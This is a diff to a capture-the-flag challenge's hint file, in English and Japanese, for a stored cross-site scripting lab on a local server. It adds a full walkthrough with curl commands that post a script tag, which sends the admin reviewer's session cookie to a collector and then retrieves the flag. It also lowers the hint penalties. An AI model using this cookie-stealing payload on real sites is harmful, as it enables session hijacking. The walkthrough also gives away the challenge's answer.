@@ -58,7 +58,11 @@
         },
         {
           "id": "hint-2",
-          "content": "Post a message containing a `<script>` tag. Whatever JavaScript is inside it will run in the reviewer's session when they check the board — including code that reads `document.cookie` and sends it somewhere. Check the reviewer's monitoring log afterward to see what got sent."
+          "content": "Post a message containing a `<script>` tag. The reviewer does not auto-poll: call `POST /admin/report` to make them open the board, then call `GET /admin/captured` to read what the script sent."
+        },
+        {
+          "id": "hint-3",
+          "content": "Full walkthrough: 1. `curl -s http://127.0.0.1:18080/post --data-urlencode 'name=attacker' --data-urlencode \"message=<script>fetch('/c?'+document.cookie)</script>\"` 2. `curl -s -X POST http://127.0.0.1:18080/admin/report` 3. `curl -s http://127.0.0.1:18080/admin/captured` — the captured URL/body contains `session=TC{xss_...}`; submit that `TC{...}`."
         }
       ]
     }
@@ -83,12 +87,17 @@
       {
         "id": "hint-1",
         "content": "自分の投稿がページ上でどう表示されるかをよく見てみよう。 `<` のような記号を入力したのに、 `&lt;` に変換されず そのまま出てくるなら、 その画面は入力をエスケープしていない。",
-        "penalty": 20
+        "penalty": 0
       },
       {
         "id": "hint-2",
-        "content": "`<script>` タグを含むメッセージを投稿してみよう。 中の JavaScript は、 セキュリティ担当が掲示板を確認したときに 担当のセッションの中で実行される ── `document.cookie` を読み取ってどこかへ送るコードも含めて。 その後、 担当側の監視ログを確認すると、 何が送信されたかが見える。",
-        "penalty": 30
+        "content": "`<script>` タグを含むメッセージを投稿してみよう。 レビュー担当は自動ポーリングしないため、 `POST /admin/report` を呼んで掲示板を開かせ、 続けて `GET /admin/captured` でスクリプトが送信した内容を確認する。",
+        "penalty": 10
+      },
+      {
+        "id": "hint-3",
+        "content": "完全な手順: 1. `curl -s http://127.0.0.1:18080/post --data-urlencode 'name=attacker' --data-urlencode \"message=<script>fetch('/c?'+document.cookie)</script>\"` 2. `curl -s -X POST http://127.0.0.1:18080/admin/report` 3. `curl -s http://127.0.0.1:18080/admin/captured` ── 記録された URL/body に `session=TC{xss_...}` が含まれるので、 その `TC{...}` を提出する。",
+        "penalty": 40
       }
     ]
   }
